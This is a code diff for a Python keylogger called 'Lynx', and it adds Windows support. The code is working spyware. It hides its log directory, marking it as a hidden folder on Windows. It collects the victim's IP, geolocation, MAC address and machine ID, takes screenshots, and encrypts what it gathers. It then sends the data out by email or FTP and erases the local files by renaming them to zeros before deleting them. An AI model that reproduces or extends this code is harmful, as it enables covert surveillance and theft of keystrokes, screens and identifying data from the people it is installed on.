@@ -24,6 +24,9 @@ from threading import Timer
 import time
 import ftplib
 import datetime
+if os.name == "nt":
+    import win32api
+    import win32con
 
 METHOD = "ftp" # or "email"
 EMAIL = {
@@ -59,7 +62,8 @@ class Keylogger():
     def __init__(self):
         self.interval = INTERVAL
         self.log = "Keylogger started ...\n"
-        self.dir = "/tmp/.cache/.lynx"
+        self.os = os.name
+        self.dir = "/tmp/.cache/.lynx" if self.os != "nt" else f'{os.environ["TEMP"]}\\cache\\lynx'
         self.system_info = ""
         self.method = METHOD
         self.get_date = lambda: str(datetime.datetime.now())[:-7].replace(":", "-")
@@ -78,6 +82,9 @@ class Keylogger():
             quit()
 
         os.makedirs(self.dir) if not os.path.exists(self.dir) else None
+        if self.os == "nt":
+            win32api.SetFileAttributes(self.dir, win32con.FILE_ATTRIBUTE_HIDDEN)
+            win32api.SetFileAttributes(self.dir[:-5], win32con.FILE_ATTRIBUTE_HIDDEN)
     
     def append_to_log(self, string):
         self.log += str(string)
@@ -93,18 +100,18 @@ class Keylogger():
         system = f"{platform.system()} {platform.release()}"
         arch = platform.machine()
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        machine_id = open("/etc/machine-id", "r").read()
+        machine_id = open("/etc/machine-id", "r").read() if self.os != "nt" else None
         self.append_to_system_info(f"IP address : {ip}\n")
         self.append_to_system_info(f"Geolocation : {geolocation}\n")
         self.append_to_system_info(f"Hostname : {hostname}\n")
         self.append_to_system_info(f"System : {system}\n")
         self.append_to_system_info(f"Architecture : {arch}\n")
         self.append_to_system_info(f"MAC address : {mac_address}\n") 
-        self.append_to_system_info(f"Unique machine ID : {machine_id}\n")
+        self.append_to_system_info(f"Unique machine ID : {machine_id}\n") if self.os != "nt" else None
         if self.method == "email":
             self.send_mail(Encryption().encrypt(self.system_info))
         elif self.method == "ftp":
-            filename = f"{self.dir}/sysinfo_{self.get_date()}"
+            filename = f"{self.dir}/sysinfo_{self.get_date()}" if self.os != "nt" else f"{self.dir}\\sysinfo_{self.get_date()}"
             with open(filename, "w") as file:
                 file.write(Encryption().encrypt(self.system_info))
             self.send_ftp(filename)
@@ -113,7 +120,7 @@ class Keylogger():
     def screenshot(self):
         filename = self.get_date()
         img = pyscreenshot.grab()
-        path = f"{self.dir}/{filename}.png"
+        path = f"{self.dir}/{filename}.png" if self.os != "nt" else f"{self.dir}\\{filename}.png"
         img.save(path)
         return path
 
@@ -130,20 +137,19 @@ class Keylogger():
             path = os.path.dirname(filename)
             nameLength = len(basename) 
 
-            for i in range(nameLength - 1):
-                newnamelen = nameLength - 1
-                newname = lambda: f"{path}/{''.join('0' for _ in range(newnamelen))}"
-                os.rename(filename, newname())
-                filename = newname()
-                nameLength = newnamelen
-            os.remove(f"{path}/0")
+        for i in range(nameLength - 1):
+            newnamelen = nameLength - 1
+            newname = lambda: f"{path}/{''.join('0' for _ in range(newnamelen))}" if self.os != "nt" else f"{path}\\{''.join('0' for _ in range(newnamelen))}"
+            os.rename(filename, newname())
+            filename = newname()
+            nameLength = newnamelen
+        os.remove(f"{path}/0") if self.os != "nt" else os.remove(f"{path}\\0")
     
     def send_mail(self, body, attachment=None):
         msg = MIMEMultipart()
         msg["To"] = self.email
         msg["From"] = self.email
         msg["Subject"] = f"Lynx Report"
-        # msgText = MIMEText(f'<b>{body}\n</b><br/><img src="cid:{attachment}"/><br/>', 'html')
         msgText = MIMEText(f'<b>{body}\n</b><br/><img src="cid:{attachment}"/><br/>', 'html') if attachment else MIMEText(f'<b>{body}\n</b>', 'html')
         msg.attach(msgText)
         if attachment:
@@ -201,7 +207,7 @@ class Keylogger():
         if self.method == "email":
             self.send_mail(Encryption().encrypt(self.log), self.screenshot()) 
         elif self.method == "ftp":
-            path = f"{self.dir}/log_from_{self.start}_to_{self.get_date()}"
+            path = f"{self.dir}/log_from_{self.start}_to_{self.get_date()}" if self.os != "nt" else f"{self.dir}\\log_from_{self.start}_to_{self.get_date()}"
             with open(path, "w") as file:
                 file.write(Encryption().encrypt(self.log))
             ss = self.screenshot()
